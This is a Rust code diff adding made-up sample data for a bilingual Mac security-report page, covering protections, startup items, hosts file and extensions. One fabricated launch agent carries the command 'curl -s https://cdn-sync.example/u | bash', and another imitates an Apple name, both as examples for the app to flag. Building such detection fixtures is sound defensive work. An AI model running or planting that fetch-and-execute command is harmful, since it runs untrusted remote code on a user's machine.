@@ -453,6 +453,7 @@ pub fn startup() -> Vec<StartupItem> {
             kind,
             plist_path: PathBuf::from(format!("{directory}/{label}.plist")),
             program: Some(program.to_string()),
+            arguments: Vec::new(),
             run_at_load,
             keep_alive,
             disabled,
@@ -758,4 +759,213 @@ pub fn history() -> Vec<AuditEntry> {
             None,
         ),
     ]
+}
+
+/// The Security page with made-up findings: a Mac in decent shape, two settings worth changing and
+/// two startup items that deserve a look.
+pub fn security() -> hm_system::security::SecurityReport {
+    use hm_system::security::{panes, Check, Level, SecurityReport, Signer, StartupReview};
+
+    let check = |id: &'static str, level, title: &str, detail: &str| Check {
+        id,
+        title: title.to_string(),
+        detail: detail.to_string(),
+        level,
+        lines: Vec::new(),
+        settings: None,
+    };
+    let protections = vec![
+        check("filevault", Level::Ok, "FileVault", t!(
+            "El disco está cifrado: si pierdes el Mac, nadie puede leerlo sin tu contraseña.",
+            "The disk is encrypted: if you lose the Mac, no one can read it without your password."
+        )),
+        check("sip", Level::Ok, t!("Protección de la integridad del sistema", "System Integrity Protection"), t!(
+            "Ni siquiera un programa con permisos de administrador puede modificar macOS.",
+            "Not even a program with administrator rights can modify macOS."
+        )),
+        check("gatekeeper", Level::Ok, "Gatekeeper", t!(
+            "macOS comprueba quién firmó las apps que descargas antes de abrirlas.",
+            "macOS checks who signed the apps you download before opening them."
+        )),
+        Check {
+            settings: Some(panes::NETWORK),
+            ..check("firewall", Level::Review, "Firewall", t!(
+                "Está desactivado, que es como viene macOS. Conviene activarlo si te conectas a redes que no son tuyas, como las de un café o una universidad.",
+                "It's off, which is how macOS ships. It's worth turning on if you join networks that aren't yours, like at a café or a university."
+            ))
+        },
+        check("security_updates", Level::Ok, t!("Actualizaciones de seguridad automáticas", "Automatic security updates"), t!(
+            "XProtect y las respuestas de seguridad rápidas se instalan solas.",
+            "XProtect and Rapid Security Responses install by themselves."
+        )),
+        check("xprotect", Level::Ok, "XProtect", t!(
+            "El detector de malware de macOS está en la versión 5377, actualizada hace 4 días.",
+            "macOS's malware detector is at version 5377, updated 4 days ago."
+        )),
+        Check {
+            lines: vec!["macOS 27.2.1".to_string()],
+            settings: Some(panes::SOFTWARE_UPDATE),
+            ..check("macos_updates", Level::Review, "macOS 27.0.1", t!(
+                "Hay actualizaciones pendientes. Suelen traer arreglos de seguridad.",
+                "There are updates waiting. They usually bring security fixes."
+            ))
+        },
+        check("auto_login", Level::Ok, t!("Inicio de sesión automático", "Automatic login"), t!(
+            "Desactivado: hace falta la contraseña para entrar.",
+            "Off: the password is needed to get in."
+        )),
+        check("screen_lock", Level::Ok, t!("Contraseña al despertar", "Password on wake"), t!(
+            "La pide en cuanto la pantalla se bloquea o el Mac entra en reposo.",
+            "It's asked for as soon as the screen locks or the Mac sleeps."
+        )),
+    ];
+
+    let developer = |name: &str, team: &str| Signer::DeveloperId {
+        name: name.to_string(),
+        team: team.to_string(),
+    };
+    let ad_hoc = t!(
+        "Su firma no identifica a nadie. Es normal en Homebrew y en lo que compilas tú.",
+        "Its signature identifies no one. That's normal for Homebrew and for what you build yourself."
+    );
+    let mut startup: Vec<StartupReview> = startup()
+        .into_iter()
+        .map(|item| {
+            let (signer, level, reasons) = match item.label.as_str() {
+                "com.google.keystone.agent" => {
+                    (developer("Google LLC", "EQHXZ8M8AV"), Level::Ok, vec![])
+                }
+                "com.docker.vmnetd" => (developer("Docker Inc", "9BNSXJN65R"), Level::Ok, vec![]),
+                "com.adobe.ccxprocess" => {
+                    (developer("Adobe Inc.", "JQ525L2MZD"), Level::Ok, vec![])
+                }
+                "com.microsoft.update.agent" => (
+                    developer("Microsoft Corporation", "UBF8T346G9"),
+                    Level::Ok,
+                    vec![],
+                ),
+                label if label.starts_with("homebrew.") => {
+                    (Signer::AdHoc, Level::Info, vec![ad_hoc.to_string()])
+                }
+                _ => (Signer::NotChecked, Level::Ok, vec![]),
+            };
+            StartupReview {
+                item,
+                signer,
+                level,
+                reasons,
+            }
+        })
+        .collect();
+    let agent = |label: &str, program: &str, arguments: &[&str]| StartupItem {
+        label: label.to_string(),
+        kind: StartupKind::UserAgent,
+        plist_path: PathBuf::from(format!("{HOME}/Library/LaunchAgents/{label}.plist")),
+        program: Some(program.to_string()),
+        arguments: arguments.iter().map(|arg| arg.to_string()).collect(),
+        run_at_load: true,
+        keep_alive: true,
+        disabled: false,
+        orphaned: false,
+        malformed: false,
+    };
+    startup.push(StartupReview {
+        item: agent(
+            "com.sync.helper",
+            "/bin/bash",
+            &[
+                "/bin/bash",
+                "-c",
+                "curl -s https://cdn-sync.example/u | bash",
+            ],
+        ),
+        signer: Signer::Script,
+        level: Level::Review,
+        reasons: vec![
+            t!(
+                "Al arrancar descarga o decodifica algo para ejecutarlo.",
+                "At startup it downloads or decodes something to run it."
+            )
+            .to_string(),
+            t!(
+                "Se añadió o cambió hace 2 días.",
+                "It was added or changed 2 days ago."
+            )
+            .to_string(),
+        ],
+    });
+    startup.push(StartupReview {
+        item: agent(
+            "com.apple.mdworker.plus",
+            "/Users/Shared/.mdw/mdworker",
+            &[],
+        ),
+        signer: Signer::Unsigned,
+        level: Level::Review,
+        reasons: vec![
+            t!(
+                "No tiene firma, así que no se sabe quién lo hizo.",
+                "It has no signature, so there's no telling who made it."
+            )
+            .to_string(),
+            t!(
+                "Está en /Users/Shared, donde puede escribir cualquier usuario.",
+                "It lives in /Users/Shared, which any user can write to."
+            )
+            .to_string(),
+            t!(
+                "Lleva un nombre de Apple, pero no lo firmó Apple.",
+                "It carries an Apple name, but Apple didn't sign it."
+            )
+            .to_string(),
+        ],
+    });
+    startup.sort_by(|a, b| {
+        b.level.cmp(&a.level).then_with(|| {
+            a.item
+                .label
+                .to_lowercase()
+                .cmp(&b.item.label.to_lowercase())
+        })
+    });
+
+    let other = vec![
+        check("sharing", Level::Ok, t!("Acceso remoto", "Remote access"), t!(
+            "No hay nada activo que deje entrar desde otro ordenador.",
+            "Nothing is on that lets someone in from another computer."
+        )),
+        Check {
+            lines: vec!["127.0.0.1 → tienda-web.test, api.tienda-web.test".to_string()],
+            ..check("hosts", Level::Info, t!("Archivo hosts", "Hosts file"), t!(
+                "Estos nombres se desvían a otra dirección. Es habitual al desarrollar; si no los añadiste tú, revísalos.",
+                "These names go to a different address. It's common when developing; if you didn't add them, look into them."
+            ))
+        },
+        check("ssh_keys", Level::Ok, t!("Claves SSH autorizadas", "Authorized SSH keys"), t!(
+            "Ninguna clave permite entrar en tu cuenta por SSH.",
+            "No key lets anyone into your account over SSH."
+        )),
+        check("cron", Level::Ok, t!("Tareas programadas (cron)", "Scheduled tasks (cron)"), t!(
+            "Tu usuario no tiene tareas programadas con cron.",
+            "Your user has no tasks scheduled with cron."
+        )),
+        check("management", Level::Ok, t!("Gestión del Mac (MDM y perfiles)", "Device management (MDM and profiles)"), t!(
+            "Ninguna organización gestiona este Mac y tu usuario no tiene perfiles de configuración.",
+            "No organization manages this Mac and your user has no configuration profiles."
+        )),
+        Check {
+            lines: vec!["Tailscale Network Extension (W5364U7YZB)".to_string()],
+            settings: Some(panes::LOGIN_ITEMS),
+            ..check("system_extensions", Level::Info, t!("Extensiones del sistema", "System extensions"), t!(
+                "Funcionan dentro de macOS con muchos privilegios: VPN, antivirus, filtros de red. Comprueba que reconoces cada una.",
+                "They run inside macOS with broad privileges: VPNs, antivirus, network filters. Check you recognize each one."
+            ))
+        },
+    ];
+    SecurityReport {
+        macos: Some("27.0.1".to_string()),
+        protections,
+        startup,
+        other,
+    }
 }
